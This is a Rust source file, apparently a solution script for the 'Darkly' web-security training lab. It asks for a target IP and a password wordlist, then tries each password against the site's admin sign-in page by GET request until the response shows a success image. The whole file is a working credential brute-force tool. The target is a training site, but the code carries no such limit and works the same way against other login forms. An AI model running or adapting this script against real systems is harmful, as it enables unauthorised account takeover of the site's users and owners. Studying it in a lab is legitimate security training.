#[allow(non_snake_case)]
use regex::Regex;
use reqwest;
use std::fs::File;
use std::io::{self, BufRead};
use std::path::Path;
use select::document::Document;
use select::predicate::Name;
use shellexpand;
use std::process;
use std::time;
use std::thread;

// ~/SecLists/Passwords/2020-200_most_used_passwords.txt

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>> where P: AsRef<Path>, {
	let file = File::open(filename)?;
	Ok(io::BufReader::new(file).lines())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
	let mut valid = false;
	let re = Regex::new(r"^(\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$").unwrap();
	let mut ip = String::new();
	while !valid {
		println!("Enter Darkly Host IP :");
		std::io::stdin().read_line(&mut ip).unwrap();
		ip.pop();
		valid = re.is_match(&ip);
	}
	let mut path = String::new();
	println!("Enter Wordlist Path :");
	std::io::stdin().read_line(&mut path).unwrap();
	path.pop();
	path = shellexpand::tilde(&path).to_string();
	let path = Path::new(&path);
    let display = path.display();
	match File::open(&path) {
		Err(why) => panic!("couldn't open {}: {}", display, why),
		Ok(file) => file,
	};
	if let Ok(lines) = read_lines(path) {
		for line in lines {
			if let Ok(password) = line {
				println!("Attempting with user: {} and password: {}", "admin", password);
				let url = format!("http://{}/index.php?page=signin&username=admin&password={}&Login=Login", ip, password);
				let res = reqwest::get(url).await?.text().await?;
				Document::from(res.as_str())
					.find(Name("img"))
					.filter_map(|n| n.attr("src"))
					.for_each(|x| {
						if x == "images/win.png" {
							println!("FOUND!");
							let ten_millis = time::Duration::from_millis(10);
							thread::sleep(ten_millis);
							process::exit(0x0100);
						}
					});
			}
		}
	}
	Ok(())
}
